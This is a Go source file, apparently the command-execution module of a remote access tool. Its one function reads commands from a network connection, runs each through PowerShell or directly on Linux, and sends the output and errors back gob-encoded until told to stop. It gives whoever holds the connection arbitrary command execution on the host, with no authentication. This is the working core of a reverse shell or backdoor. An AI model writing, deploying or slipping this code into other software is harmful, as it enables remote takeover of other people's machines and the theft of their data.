package executesystemcommandwindows

import (
	"bufio"
	"bytes"
	"encoding/gob"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

type Command struct {
	CommandOutput string
	CmdError      string
}

func ExecuteCommandWindows(connection net.Conn) (err error) {
	reader := bufio.NewReader(connection)

	commandLoop := true

	for commandLoop {
		userInput, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
		}

		userInput = strings.TrimPrefix(userInput, "\n")

		if userInput == "stop\n" {
			commandLoop = false
		} else {

			fmt.Println("[+] User Command: ", userInput)

			var cmdInstance *exec.Cmd

			if runtime.GOOS == "windows" {
				// execute here
				cmdInstance = exec.Command("powershell.exe", "/C", userInput)
			} else {
				// linux execute here
				cmdInstance = exec.Command(userInput)
			}
			var output bytes.Buffer
			var CommandErr bytes.Buffer

			cmdInstance.Stdout = &output
			cmdInstance.Stderr = &CommandErr

			err = cmdInstance.Run()
			if err != nil {
				fmt.Println("failed to run: ", err)
			}

			cmdStruct := &Command{}

			cmdStruct.CommandOutput = output.String()
			cmdStruct.CmdError = CommandErr.String()

			encoder := gob.NewEncoder(connection)

			err = encoder.Encode(cmdStruct)
			if err != nil {
				fmt.Println("failed to encode: ", err)
				continue
			}
		}
	}
	return err
}
